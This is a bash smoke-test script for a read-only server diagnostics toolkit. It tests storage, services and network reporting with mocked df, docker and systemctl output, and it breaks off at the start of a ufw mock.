#!/usr/bin/env bash
# test.sh - lightweight smoke tests for server-toolkit
#
# No framework/package dependency: plain bash + standard tools only.
set -uo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd -P)"
TOOLKIT_DIR="$(cd -- "${SCRIPT_DIR}/.." >/dev/null 2>&1 && pwd -P)"
BIN_DIR="${TOOLKIT_DIR}/bin"
LIB_DIR="${TOOLKIT_DIR}/lib"

pass=0
fail=0

ok() { printf '  ok   - %s\n' "$1"; pass=$(( pass + 1 )); }
bad() { printf '  FAIL - %s\n' "$1"; fail=$(( fail + 1 )); }

echo "== bash -n syntax check =="
for f in "${BIN_DIR}"/info "${BIN_DIR}"/gpu-info "${BIN_DIR}"/docker-info "${BIN_DIR}"/network-info "${BIN_DIR}"/storage-info "${BIN_DIR}"/services-info "${BIN_DIR}"/security-info "${BIN_DIR}"/process-info "${BIN_DIR}"/logs-info "${BIN_DIR}"/backup-info "${TOOLKIT_DIR}"/lib/*.sh; do
    if bash -n "$f" 2>/dev/null; then
        ok "bash -n $f"
    else
        bad "bash -n $f"
    fi
done

echo "== info runs successfully =="
if "${BIN_DIR}/info" >/tmp/toolkit_test_info.out 2>/tmp/toolkit_test_info.err; then
    ok "info exits 0"
else
    bad "info exited non-zero: $(cat /tmp/toolkit_test_info.err)"
fi

echo "== gpu-info runs successfully =="
if "${BIN_DIR}/gpu-info" >/tmp/toolkit_test_gpu.out 2>/tmp/toolkit_test_gpu.err; then
    ok "gpu-info exits 0"
else
    bad "gpu-info exited non-zero: $(cat /tmp/toolkit_test_gpu.err)"
fi

echo "== docker-info runs successfully (live Docker) =="
if "${BIN_DIR}/docker-info" >/tmp/toolkit_test_docker.out 2>/tmp/toolkit_test_docker.err; then
    ok "docker-info exits 0"
    if grep -q '^CONTAINERS$' /tmp/toolkit_test_docker.out && grep -q '^HEALTH$' /tmp/toolkit_test_docker.out; then
        ok "docker-info prints CONTAINERS and HEALTH sections"
    else
        bad "docker-info output is missing expected sections"
    fi
else
    bad "docker-info exited non-zero: $(cat /tmp/toolkit_test_docker.err)"
fi

echo "== network-info runs successfully (live network) =="
if "${BIN_DIR}/network-info" >/tmp/toolkit_test_network.out 2>/tmp/toolkit_test_network.err; then
    ok "network-info exits 0"
    if grep -q '^INTERFACES$' /tmp/toolkit_test_network.out && grep -q '^CONNECTIVITY$' /tmp/toolkit_test_network.out; then
        ok "network-info prints INTERFACES and CONNECTIVITY sections"
    else
        bad "network-info output is missing expected sections"
    fi
else
    bad "network-info exited non-zero: $(cat /tmp/toolkit_test_network.err)"
fi

echo "== primary interface detection works =="
detected_iface="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/system.sh"
    get_primary_interface
')"
route_iface="$(ip -j route show default 2>/dev/null | jq -r '.[0].dev // empty')"
if [[ -n "$detected_iface" && "$detected_iface" == "$route_iface" ]]; then
    ok "get_primary_interface matches the kernel's default-route interface ($detected_iface)"
else
    bad "get_primary_interface ('$detected_iface') did not match 'ip route' ('$route_iface')"
fi

echo "== /proc/net/dev parsing works =="
traffic_fields="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/system.sh"
    source "'"${LIB_DIR}"'/network.sh"
    iface="$(get_primary_interface)"
    get_interface_traffic "$iface"
')"
if [[ -n "$traffic_fields" ]] && [[ "$(wc -w <<<"$traffic_fields")" -eq 8 ]] && [[ "$traffic_fields" =~ ^[0-9]+\ [0-9]+\ [0-9]+\ [0-9]+\ [0-9]+\ [0-9]+\ [0-9]+\ [0-9]+$ ]]; then
    ok "get_interface_traffic returns 8 numeric fields from /proc/net/dev"
else
    bad "get_interface_traffic did not return 8 numeric fields: '$traffic_fields'"
fi

echo "== missing link speed is handled =="
docker0_speed="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/system.sh"
    get_link_speed docker0
')"
nonexistent_speed="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/system.sh"
    get_link_speed nonexistent-iface-xyz
')"
if [[ "$docker0_speed" == "N/A" && "$nonexistent_speed" == "N/A" ]]; then
    ok "get_link_speed reports N/A when speed is unavailable (docker0 and a nonexistent interface)"
else
    bad "get_link_speed did not report N/A (docker0='$docker0_speed', nonexistent='$nonexistent_speed')"
fi

echo "== storage-info runs successfully (live filesystem) =="
if "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage.out 2>/tmp/toolkit_test_storage.err; then
    ok "storage-info exits 0"
    if grep -q '^FILESYSTEM$' /tmp/toolkit_test_storage.out && grep -q '^DOCKER STORAGE$' /tmp/toolkit_test_storage.out; then
        ok "storage-info prints FILESYSTEM and DOCKER STORAGE sections"
    else
        bad "storage-info output is missing expected sections"
    fi
else
    bad "storage-info exited non-zero: $(cat /tmp/toolkit_test_storage.err)"
fi

echo "== directory-size collection works with a mock directory tree =="
TREE_DIR="$(mktemp -d)"
mkdir -p "${TREE_DIR}/a" "${TREE_DIR}/b"
dd if=/dev/zero of="${TREE_DIR}/a/big.bin" bs=1M count=2 status=none 2>/dev/null
dd if=/dev/zero of="${TREE_DIR}/b/small.bin" bs=1K count=10 status=none 2>/dev/null
mkdir -p "${TREE_DIR}/noperm"
: >"${TREE_DIR}/noperm/hidden.bin"
chmod 000 "${TREE_DIR}/noperm"

tree_total="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/storage.sh"
    get_dir_total_bytes "'"${TREE_DIR}"'"
')"
if [[ "$tree_total" =~ ^[0-9]+$ ]] && [[ "$tree_total" -gt 2000000 ]]; then
    ok "get_dir_total_bytes sums a mock directory tree ($tree_total bytes)"
else
    bad "get_dir_total_bytes did not return a sensible total: '$tree_total'"
fi

echo "== permission-denied paths do not crash the command =="
depth_out="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/storage.sh"
    get_dir_sizes_at_depth "'"${TREE_DIR}"'" 1
')"
depth_exit=$?
if [[ "$depth_exit" -eq 0 ]] && grep -q "${TREE_DIR}/a" <<<"$depth_out" && grep -q "${TREE_DIR}/b" <<<"$depth_out"; then
    ok "get_dir_sizes_at_depth tolerates a permission-denied subdirectory and still reports readable ones"
else
    bad "get_dir_sizes_at_depth failed or lost readable entries when a subdir was unreadable: '$depth_out'"
fi

echo "== large-file detection works with mock files =="
files_out="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/storage.sh"
    get_large_files_in "'"${TREE_DIR}"'" 1M
')"
if grep -q "${TREE_DIR}/a/big.bin" <<<"$files_out" && ! grep -q "small.bin" <<<"$files_out"; then
    ok "get_large_files_in finds the 2MB file and excludes the 10KB file at a 1M threshold"
else
    bad "get_large_files_in did not correctly filter by size: '$files_out'"
fi

chmod 755 "${TREE_DIR}/noperm"
rm -rf "$TREE_DIR"

echo "== diskstats parsing works =="
diskstats_result="$(printf '   7       0 loop0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n   8       0 sda 1 0 2000 0 0 0 4000 0 0 0 0 0 0 0 0 0 0\n   8       1 sda1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n 252       0 dm-0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n' | awk '
    $3 ~ /^(sd[a-z]+|vd[a-z]+|xvd[a-z]+|hd[a-z]+|nvme[0-9]+n[0-9]+|mmcblk[0-9]+)$/ {
        print $3"|"($6*512)"|"($10*512)
    }
')"
if [[ "$diskstats_result" == "sda|1024000|2048000" ]]; then
    ok "diskstats parsing extracts whole-disk devices and converts sectors to bytes correctly"
else
    bad "diskstats parsing produced unexpected output: '$diskstats_result'"
fi

echo "== df/inode parsing and threshold alerts work (mocked df) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/df" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `df` for storage-info tests. Behavior selected by
# $DF_MOCK_SCENARIO: "normal", "high" (one filesystem/inode over threshold),
# or "fail" (df itself fails, simulating it being unavailable).
scenario="${DF_MOCK_SCENARIO:-normal}"
[[ "$scenario" == "fail" ]] && exit 1

case "$*" in
    *ipcent*)
        printf 'Mounted-on Type IUse%%\n'
        printf '/ ext4 5%%\n'
        printf '/boot ext4 1%%\n'
        [[ "$scenario" == "high" ]] && printf '/data xfs 92%%\n'
        ;;
    *)
        printf 'Mounted-on Type Size Used Avail Use%%\n'
        printf '/ ext4 536870912000 150323855360 359081820160 28%%\n'
        printf '/boot ext4 2040373248 210558976 1705664512 11%%\n'
        [[ "$scenario" == "high" ]] && printf '/data xfs 1000000000000 950000000000 50000000000 95%%\n'
        ;;
esac
MOCKEOF
chmod +x "${MOCK_DIR}/df"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if DF_MOCK_SCENARIO=normal PATH="$MOCK_PATH" "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage_normal.out 2>/tmp/toolkit_test_storage_normal.err; then
    if grep -qE '^/ +ext4' /tmp/toolkit_test_storage_normal.out; then
        ok "storage-info FILESYSTEM section reflects mocked df output"
    else
        bad "storage-info did not show the mocked filesystem"
    fi
    if grep -qE '^/ +5%$' /tmp/toolkit_test_storage_normal.out; then
        ok "storage-info INODES section reflects mocked df output"
    else
        bad "storage-info did not show the mocked inode usage"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_storage_normal.out | grep -qi 'full\|critical\|high'; then
        bad "storage-info raised a filesystem/inode alert for normal usage values"
    else
        ok "storage-info raises no filesystem/inode alerts for normal usage values"
    fi
else
    bad "storage-info failed with normal mocked df: $(cat /tmp/toolkit_test_storage_normal.err)"
fi

if DF_MOCK_SCENARIO=high PATH="$MOCK_PATH" "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage_high.out 2>/tmp/toolkit_test_storage_high.err; then
    if grep -A10 '^ALERTS$' /tmp/toolkit_test_storage_high.out | grep -qi "'/data'.*critically full"; then
        ok "storage-info raises a critical alert for a filesystem at 95%"
    else
        bad "storage-info did not raise a critical filesystem alert at 95%"
    fi
    if grep -A10 '^ALERTS$' /tmp/toolkit_test_storage_high.out | grep -qi "inode usage on '/data' is critical"; then
        ok "storage-info raises a critical inode-usage alert at 92% (>= 90% threshold)"
    else
        bad "storage-info did not raise a critical inode-usage alert at 92%"
    fi
else
    bad "storage-info failed with high-usage mocked df: $(cat /tmp/toolkit_test_storage_high.err)"
fi

if DF_MOCK_SCENARIO=fail PATH="$MOCK_PATH" "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage_missingfs.out 2>/tmp/toolkit_test_storage_missingfs.err; then
    if grep -A2 '^FILESYSTEM$' /tmp/toolkit_test_storage_missingfs.out | grep -q 'N/A' && \
       grep -A2 '^INODES$' /tmp/toolkit_test_storage_missingfs.out | grep -q 'N/A'; then
        ok "storage-info handles df being entirely unavailable without crashing"
    else
        bad "storage-info did not gracefully report missing filesystem data"
    fi
else
    bad "storage-info failed when df was mocked unavailable: $(cat /tmp/toolkit_test_storage_missingfs.err)"
fi
rm -rf "$MOCK_DIR"

echo "== storage-info handles Docker unavailable =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/docker"
chmod +x "${STUB_DIR}/docker"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage_nodocker.out 2>/tmp/toolkit_test_storage_nodocker.err; then
    if grep -A2 '^DOCKER STORAGE$' /tmp/toolkit_test_storage_nodocker.out | grep -qE 'Docker +unavailable'; then
        ok "storage-info reports Docker unavailable and still exits 0"
    else
        bad "storage-info did not report Docker as unavailable"
    fi
else
    bad "storage-info failed when docker was mocked unavailable: $(cat /tmp/toolkit_test_storage_nodocker.err)"
fi
rm -rf "$STUB_DIR"

echo "== Docker storage parsing works with mocked docker output =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/docker" <<'MOCKEOF'
#!/usr/bin/env bash
case "$1" in
    info) exit 0 ;;
    system)
        if [[ "${2:-}" == "df" ]]; then
            printf '{"Type":"Images","Size":"5GB","Reclaimable":"1GB (20%%)","TotalCount":"3","Active":"3"}\n'
            printf '{"Type":"Containers","Size":"100MB","Reclaimable":"0B (0%%)","TotalCount":"2","Active":"2"}\n'
            printf '{"Type":"Local Volumes","Size":"2GB","Reclaimable":"0B (0%%)","TotalCount":"1","Active":"1"}\n'
            printf '{"Type":"Build Cache","Size":"500MB","Reclaimable":"500MB","TotalCount":"5","Active":"0"}\n'
        fi
        ;;
esac
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/docker"
if PATH="${MOCK_DIR}:${PATH}" "${BIN_DIR}/storage-info" >/tmp/toolkit_test_storage_dockerdf.out 2>/tmp/toolkit_test_storage_dockerdf.err; then
    if grep -qE '^Images +5GB$' /tmp/toolkit_test_storage_dockerdf.out && \
       grep -qE '^Local Volumes +2GB$' /tmp/toolkit_test_storage_dockerdf.out; then
        ok "storage-info DOCKER STORAGE section reflects mocked docker system df output"
    else
        bad "storage-info did not correctly parse mocked docker system df output"
    fi
    if grep -qE '^Total +7GiB$' /tmp/toolkit_test_storage_dockerdf.out; then
        ok "storage-info computes a correct Docker storage total from mocked sizes"
    else
        bad "storage-info Docker storage Total did not match expected sum: $(grep '^Total' /tmp/toolkit_test_storage_dockerdf.out)"
    fi
else
    bad "storage-info failed with mocked docker system df: $(cat /tmp/toolkit_test_storage_dockerdf.err)"
fi
rm -rf "$MOCK_DIR"

echo "== storage-info reads real data without modifying it =="
CANARY_BEFORE="$(stat -c '%Y' "$HOME" 2>/dev/null)"
"${BIN_DIR}/storage-info" >/dev/null 2>&1 || true
CANARY_AFTER="$(stat -c '%Y' "$HOME" 2>/dev/null)"
if [[ "$CANARY_BEFORE" == "$CANARY_AFTER" ]]; then
    ok "running storage-info did not change \$HOME's mtime"
else
    bad "\$HOME's mtime changed after running storage-info ($CANARY_BEFORE -> $CANARY_AFTER)"
fi
if ! grep -qE '\brm\b|\btruncate\b|docker (system|builder) prune|docker (rm|rmi|stop|kill|restart)' \
    "${TOOLKIT_DIR}/lib/storage.sh" "${BIN_DIR}/storage-info"; then
    ok "storage.sh / storage-info contain no delete/truncate/prune/restart commands"
else
    bad "storage.sh / storage-info appear to contain a destructive command"
fi

echo "== services-info runs successfully (live systemd) =="
if "${BIN_DIR}/services-info" >/tmp/toolkit_test_services.out 2>/tmp/toolkit_test_services.err; then
    ok "services-info exits 0"
    if grep -q '^SERVICES$' /tmp/toolkit_test_services.out && grep -q '^ACTIVE SERVICES$' /tmp/toolkit_test_services.out; then
        ok "services-info prints SERVICES and ACTIVE SERVICES sections"
    else
        bad "services-info output is missing expected sections"
    fi
else
    bad "services-info exited non-zero: $(cat /tmp/toolkit_test_services.err)"
fi

echo "== service uptime/PID/restart-count formatting (pure functions) =="
uptime_missing="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_uptime ""')"
uptime_invalid="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_uptime "not-a-timestamp"')"
uptime_future="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_uptime "$(date -d "+1 day" "+%a %Y-%m-%d %H:%M:%S %Z")"')"
uptime_valid="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_uptime "$(date -d "-2 hours" "+%a %Y-%m-%d %H:%M:%S %Z")"')"
if [[ "$uptime_missing" == "N/A" && "$uptime_invalid" == "N/A" && "$uptime_future" == "N/A" && "$uptime_valid" == "2h 0m" ]]; then
    ok "format_service_uptime handles missing/invalid/future timestamps as N/A and formats a valid one correctly"
else
    bad "format_service_uptime mismatch: missing='$uptime_missing' invalid='$uptime_invalid' future='$uptime_future' valid='$uptime_valid'"
fi

pid_zero="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_pid "0"')"
pid_empty="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_pid ""')"
pid_valid="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_service_pid "4242"')"
if [[ "$pid_zero" == "N/A" && "$pid_empty" == "N/A" && "$pid_valid" == "4242" ]]; then
    ok "format_service_pid treats 0/empty MainPID as N/A and passes through a real PID"
else
    bad "format_service_pid mismatch: zero='$pid_zero' empty='$pid_empty' valid='$pid_valid'"
fi

restarts_missing="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_restart_count ""')"
restarts_valid="$(bash -c 'source "'"${LIB_DIR}"'/common.sh"; source "'"${LIB_DIR}"'/services.sh"; format_restart_count "3"')"
if [[ "$restarts_missing" == "N/A" && "$restarts_valid" == "3" ]]; then
    ok "format_restart_count reports N/A when absent and the real count when present"
else
    bad "format_restart_count mismatch: missing='$restarts_missing' valid='$restarts_valid'"
fi

echo "== services-info mocked scenarios (systemctl scripted) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `systemctl` for services-info tests. Behavior selected by
# $SERVICES_MOCK_SCENARIO. Never changes any state - read-only responses only.
scenario="${SERVICES_MOCK_SCENARIO:-normal}"

[[ "$scenario" == "cmdfail" ]] && exit 1

case "$1" in
    --version)
        printf 'systemd 255 (255.4-1ubuntu8.17)\n+PAM +AUDIT\n'
        ;;
    is-system-running)
        if [[ "$scenario" == "degraded" ]]; then
            printf 'degraded\n'
            exit 1
        fi
        printf 'running\n'
        ;;
    list-units)
        if [[ "$*" == *"--failed"* ]]; then
            case "$scenario" in
                failed) printf 'broken.service loaded failed failed A broken test service\n' ;;
            esac
        else
            case "$scenario" in
                zero) : ;;
                malformed)
                    printf 'ssh.service loaded active running OpenBSD Secure Shell server\n'
                    printf 'weird.service\n'
                    ;;
                failed)
                    printf 'ssh.service loaded active running OpenBSD Secure Shell server\n'
                    printf 'broken.service loaded failed failed A broken test service\n'
                    ;;
                *)
                    printf 'ssh.service loaded active running OpenBSD Secure Shell server\n'
                    printf 'nginx.service loaded active running nginx web server\n'
                    ;;
            esac
        fi
        ;;
    show)
        unit="$2"
        if [[ "$scenario" == "noaccess" && "$unit" == "docker.service" ]]; then
            exit 0
        fi
        case "$unit" in
            ssh.service)
                printf 'Id=ssh.service\nLoadState=loaded\nActiveState=active\nSubState=running\nMainPID=100\n'
                printf 'ActiveEnterTimestamp=%s\nDescription=OpenBSD Secure Shell server\nNRestarts=0\nResult=success\n' \
                    "$(date -d '-2 hours' '+%a %Y-%m-%d %H:%M:%S UTC')"
                ;;
            nginx.service)
                printf 'Id=nginx.service\nLoadState=loaded\nActiveState=active\nSubState=running\nMainPID=200\n'
                printf 'ActiveEnterTimestamp=%s\nDescription=nginx web server\nNRestarts=1\nResult=success\n' \
                    "$(date -d '-3 hours' '+%a %Y-%m-%d %H:%M:%S UTC')"
                ;;
            broken.service)
                printf 'Id=broken.service\nLoadState=loaded\nActiveState=failed\nSubState=failed\nMainPID=0\n'
                printf 'ActiveEnterTimestamp=\nDescription=A broken test service\nNRestarts=3\nResult=exit-code\n'
                ;;
            *)
                printf 'Id=%s\nLoadState=not-found\nActiveState=inactive\nSubState=dead\n' "$unit"
                ;;
        esac
        ;;
esac
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/systemctl"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if SERVICES_MOCK_SCENARIO=normal PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_normal.out 2>/tmp/toolkit_test_services_normal.err; then
    if grep -qE '^ssh\.service +active +running$' /tmp/toolkit_test_services_normal.out; then
        ok "services-info parses ACTIVE SERVICES state/sub-state correctly (mocked)"
    else
        bad "services-info did not correctly parse mocked active/sub state"
    fi
    if grep -A2 '^FAILED SERVICES$' /tmp/toolkit_test_services_normal.out | grep -q 'None'; then
        ok "services-info shows 'None' for FAILED SERVICES when nothing is failed"
    else
        bad "services-info did not show 'None' for no failed services"
    fi
    if grep -A10 '^ALERTS$' /tmp/toolkit_test_services_normal.out | grep -q 'Systemd healthy'; then
        ok "services-info raises no alert for a normal, healthy mocked system"
    else
        bad "services-info raised an unexpected alert for a normal mocked system"
    fi
    if grep -qE '^ssh\.service +active +running +100 +2h 0m +0$' /tmp/toolkit_test_services_normal.out; then
        ok "services-info IMPORTANT SERVICES row shows correct PID/uptime/restarts for ssh (mocked)"
    else
        bad "services-info IMPORTANT SERVICES row for ssh did not match expected fields"
    fi
    if grep -q '^sshd\.service' /tmp/toolkit_test_services_normal.out || grep -q '^ufw\.service' /tmp/toolkit_test_services_normal.out; then
        bad "services-info listed a candidate service that should have been silently skipped (not-found)"
    else
        ok "services-info silently skips important-service candidates that don't exist on the host"
    fi
else
    bad "services-info failed on the normal mocked scenario: $(cat /tmp/toolkit_test_services_normal.err)"
fi

if SERVICES_MOCK_SCENARIO=zero PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_zero.out 2>/tmp/toolkit_test_services_zero.err; then
    if grep -qE '^Running +0$' /tmp/toolkit_test_services_zero.out && grep -qE '^Loaded +0$' /tmp/toolkit_test_services_zero.out; then
        ok "services-info reports 0 running / 0 loaded with zero services (mocked)"
    else
        bad "services-info did not report zero counts correctly"
    fi
    if grep -A2 '^ACTIVE SERVICES$' /tmp/toolkit_test_services_zero.out | grep -q 'None'; then
        ok "services-info shows 'None' for ACTIVE SERVICES with zero services"
    else
        bad "services-info did not show 'None' for zero active services"
    fi
else
    bad "services-info failed on the zero-services mocked scenario: $(cat /tmp/toolkit_test_services_zero.err)"
fi

if SERVICES_MOCK_SCENARIO=failed PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_failed.out 2>/tmp/toolkit_test_services_failed.err; then
    if grep -qE '^Failed +1$' /tmp/toolkit_test_services_failed.out; then
        ok "services-info reports Failed 1 with a mocked failed service"
    else
        bad "services-info did not report the failed count correctly"
    fi
    if grep -A8 '^FAILED SERVICES$' /tmp/toolkit_test_services_failed.out | grep -q '^broken.service$' && \
       grep -A8 '^FAILED SERVICES$' /tmp/toolkit_test_services_failed.out | grep -qE 'Main PID +N/A' && \
       grep -A8 '^FAILED SERVICES$' /tmp/toolkit_test_services_failed.out | grep -qE 'Restarts +3'; then
        ok "services-info FAILED SERVICES detail shows the broken unit with N/A PID and restart count 3"
    else
        bad "services-info FAILED SERVICES detail block did not match expected fields"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_services_failed.out | grep -qi '1 failed systemd service'; then
        ok "services-info raises an alert for the failed service"
    else
        bad "services-info did not raise an alert for the failed service"
    fi
else
    bad "services-info failed on the failed-service mocked scenario: $(cat /tmp/toolkit_test_services_failed.err)"
fi

if SERVICES_MOCK_SCENARIO=degraded PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_degraded.out 2>/tmp/toolkit_test_services_degraded.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_services_degraded.out | grep -qi 'degraded'; then
        ok "services-info alerts on systemd overall state 'degraded' even with zero failed units"
    else
        bad "services-info did not alert on a degraded overall state"
    fi
else
    bad "services-info failed on the degraded mocked scenario: $(cat /tmp/toolkit_test_services_degraded.err)"
fi

if SERVICES_MOCK_SCENARIO=malformed PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_malformed.out 2>/tmp/toolkit_test_services_malformed.err; then
    ok "services-info tolerates a malformed/short list-units line without crashing"
    if grep -qE '^ssh\.service +active +running$' /tmp/toolkit_test_services_malformed.out; then
        ok "services-info still shows the well-formed entry alongside a malformed one"
    else
        bad "services-info lost the well-formed entry when a malformed line was present"
    fi
else
    bad "services-info crashed on malformed list-units output: $(cat /tmp/toolkit_test_services_malformed.err)"
fi

if SERVICES_MOCK_SCENARIO=noaccess PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_noaccess.out 2>/tmp/toolkit_test_services_noaccess.err; then
    if ! grep -q '^docker\.service' /tmp/toolkit_test_services_noaccess.out; then
        ok "services-info gracefully skips a candidate whose properties are inaccessible (empty 'show' output)"
    else
        bad "services-info did not gracefully handle inaccessible/empty properties for a candidate"
    fi
else
    bad "services-info crashed when a candidate's properties were inaccessible: $(cat /tmp/toolkit_test_services_noaccess.err)"
fi

if SERVICES_MOCK_SCENARIO=cmdfail PATH="$MOCK_PATH" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_cmdfail.out 2>/tmp/toolkit_test_services_cmdfail.err; then
    if grep -A2 '^SERVICES$' /tmp/toolkit_test_services_cmdfail.out | grep -q 'Systemd'; then
        ok "services-info exits 0 and still prints a SERVICES section when systemctl itself fails entirely"
    else
        bad "services-info did not degrade gracefully when systemctl failed entirely"
    fi
else
    bad "services-info failed (nonzero exit) when systemctl commands failed entirely: $(cat /tmp/toolkit_test_services_cmdfail.err)"
fi
rm -rf "$MOCK_DIR"

echo "== services-info handles systemctl/systemd unavailable =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/systemctl"
chmod +x "${STUB_DIR}/systemctl"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_nosystemd.out 2>/tmp/toolkit_test_services_nosystemd.err; then
    if grep -A2 '^SERVICES$' /tmp/toolkit_test_services_nosystemd.out | grep -qE 'Systemd +N/A'; then
        ok "services-info reports Systemd: N/A and exits 0 when systemctl is unusable"
    else
        bad "services-info did not report Systemd: N/A when systemctl was unusable"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_services_nosystemd.out | grep -q 'healthy'; then
        ok "services-info does not alert merely because systemd is unavailable (environment-dependent, like GPU)"
    else
        bad "services-info unexpectedly alerted when systemd was simply unavailable"
    fi
else
    bad "services-info failed when systemctl was unusable: $(cat /tmp/toolkit_test_services_nosystemd.err)"
fi
rm -rf "$STUB_DIR"

echo "== services-info bounds a hanging journalctl with a timeout =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
case "$1" in
    --version) printf 'systemd 255\n' ;;
    is-system-running) printf 'running\n' ;;
    list-units)
        if [[ "$*" == *"--failed"* ]]; then
            printf 'broken.service loaded failed failed A broken test service\n'
        else
            printf 'broken.service loaded failed failed A broken test service\n'
        fi
        ;;
    show)
        printf 'Id=%s\nLoadState=loaded\nActiveState=failed\nSubState=failed\nMainPID=0\n' "$2"
        printf 'ActiveEnterTimestamp=\nDescription=A broken test service\nNRestarts=1\nResult=exit-code\n'
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/journalctl" <<'MOCKEOF'
#!/usr/bin/env bash
# Simulates a hung journalctl to prove our internal `timeout` wrapper bounds it.
sleep 30
MOCKEOF
chmod +x "${MOCK_DIR}/systemctl" "${MOCK_DIR}/journalctl"

start_ts=$(date +%s)
if PATH="${MOCK_DIR}:${PATH}" timeout 15 "${BIN_DIR}/services-info" >/tmp/toolkit_test_services_hang.out 2>/tmp/toolkit_test_services_hang.err; then
    end_ts=$(date +%s)
    elapsed=$(( end_ts - start_ts ))
    if [[ "$elapsed" -lt 10 ]]; then
        ok "services-info does not hang when journalctl stalls (finished in ${elapsed}s, internal timeout bounded it)"
    else
        bad "services-info took too long (${elapsed}s) with a stalled journalctl - internal timeout may not be working"
    fi
else
    bad "services-info did not complete within the outer 15s safety timeout when journalctl hung"
fi
rm -rf "$MOCK_DIR"

echo "== services-info: no state-changing commands present (static check) =="
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|(^|[^A-Za-z0-9_])service +[A-Za-z0-9._-]+ +(start|stop|restart|reload)\b|(^|[^A-Za-z0-9_.])pkill\b' \
    "${TOOLKIT_DIR}/lib/services.sh" "${BIN_DIR}/services-info"; then
    ok "services.sh / services-info contain no systemctl/service state-changing invocations"
else
    bad "services.sh / services-info appear to contain a state-changing command"
fi
if grep -nE '(^|[^A-Za-z0-9_.])kill +[-\$\"]*[0-9A-Za-z]' "${TOOLKIT_DIR}/lib/services.sh" "${BIN_DIR}/services-info" | grep -qv '\-\-'; then
    bad "services.sh / services-info appear to invoke 'kill' as a command"
else
    ok "services.sh / services-info do not invoke 'kill' as a command (only as text, if at all)"
fi

echo "== security-info runs successfully (live host) =="
if "${BIN_DIR}/security-info" >/tmp/toolkit_test_security.out 2>/tmp/toolkit_test_security.err; then
    ok "security-info exits 0"
    if grep -q '^UFW$' /tmp/toolkit_test_security.out && grep -q '^SSH$' /tmp/toolkit_test_security.out && \
       grep -q '^PUBLIC LISTENERS$' /tmp/toolkit_test_security.out; then
        ok "security-info prints UFW, SSH and PUBLIC LISTENERS sections"
    else
        bad "security-info output is missing expected sections"
    fi
    if grep -A2 '^UFW$' /tmp/toolkit_test_security.out | grep -qi 'N/A'; then
        ok "security-info (non-root) reports UFW as N/A rather than crashing (real permission handling)"
    else
        bad "security-info did not gracefully report UFW inaccessibility as non-root"
    fi
else
    bad "security-info exited non-zero: $(cat /tmp/toolkit_test_security.err)"
fi

echo "== security-info mocked scenarios (ufw/systemctl/ss/journalctl scripted) =="
MOCK_DIR="$(mktemp -d)"

cat >"${MOCK_DIR}/ufw" <<'MOCKEOF'
